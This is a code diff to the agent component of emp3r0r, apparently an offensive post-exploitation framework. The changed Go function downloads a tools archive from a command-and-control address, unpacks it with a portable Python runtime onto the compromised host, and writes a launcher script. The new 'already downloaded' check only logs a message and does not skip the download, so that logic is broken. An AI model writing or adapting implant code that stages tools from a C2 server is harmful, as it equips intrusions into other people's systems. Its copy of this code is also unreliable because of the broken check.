@@ -15,53 +15,52 @@ import (
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	exe_utils "github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-func VaccineHandler(checksum string) (out string) {
+func VaccineHandler(download_addr, checksum string) (out string) {
 	if runtime.GOOS != "linux" {
 		return "Only supported in Linux"
 	}
 
 	const UtilsArchive = "utils.tar.xz"
-
 	var (
 		PythonArchive = RuntimeConfig.UtilsPath + "/python3.tar.xz"
 		PythonLib     = RuntimeConfig.UtilsPath + "/python3.11"
 		PythonPath    = fmt.Sprintf("%s:%s:%s", PythonLib, PythonLib+"/lib-dynload", PythonLib+"/site-packages")
-
-		// run python scripts with this command
-		// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
-		PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
+		PythonCmd     = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
 			"LD_LIBRARY_PATH=%s/lib %s ",
 			PythonPath, PythonLib,
 			RuntimeConfig.UtilsPath, RuntimeConfig.UtilsPath+"/python3")
-
-		// run python itself with this script
-		PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
+		PythonLauncher   = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
+		UtilsArchivePath = RuntimeConfig.AgentRoot + "/" + UtilsArchive
 	)
 
+	// do not download if already downloaded
+	if util.IsFileExist(UtilsArchivePath) && tun.SHA256SumFile(UtilsArchivePath) == checksum {
+		log.Printf("%s already exists, skipping download", UtilsArchivePath)
+	}
+
 	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/"+UtilsArchive)
-	_, err := SmartDownload(UtilsArchive, RuntimeConfig.AgentRoot+"/"+UtilsArchive, checksum)
+	_, err := SmartDownload(download_addr, UtilsArchive, UtilsArchivePath, checksum)
 	out = "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
 		out = "[-] Download error: " + err.Error()
 		return
 	}
-	defer os.Remove(RuntimeConfig.AgentRoot + "/" + UtilsArchive)
 
 	// unpack utils.tar.xz to our PATH
 	extractPath := RuntimeConfig.UtilsPath
-	if err = util.Unarchive(RuntimeConfig.AgentRoot+"/"+UtilsArchive, extractPath); err != nil {
+	if err = util.Unarchive(UtilsArchivePath, extractPath); err != nil {
 		log.Printf("Unarchive: %v", err)
 		return fmt.Sprintf("Unarchive: %v", err)
 	}
 	log.Printf("%s extracted", UtilsArchive)
 
-	// libs
-	if err = util.Unarchive(RuntimeConfig.UtilsPath+"/libs.tar.xz",
-		RuntimeConfig.UtilsPath); err != nil {
+	// unpack libs
+	if err = util.Unarchive(RuntimeConfig.UtilsPath+"/libs.tar.xz", extractPath); err != nil {
 		log.Printf("Unarchive: %v", err)
 		out = fmt.Sprintf("Unarchive libs: %v", err)
 		return
@@ -74,7 +73,7 @@ func VaccineHandler(checksum string) (out string) {
 	os.RemoveAll(PythonLib)
 	log.Printf("Found python archive at %s, trying to configure", PythonArchive)
 	defer os.Remove(PythonArchive)
-	if err = util.Unarchive(PythonArchive, RuntimeConfig.UtilsPath); err != nil {
+	if err = util.Unarchive(PythonArchive, extractPath); err != nil {
 		out = fmt.Sprintf("Unarchive python libs: %v", err)
 		log.Print(out)
 		return
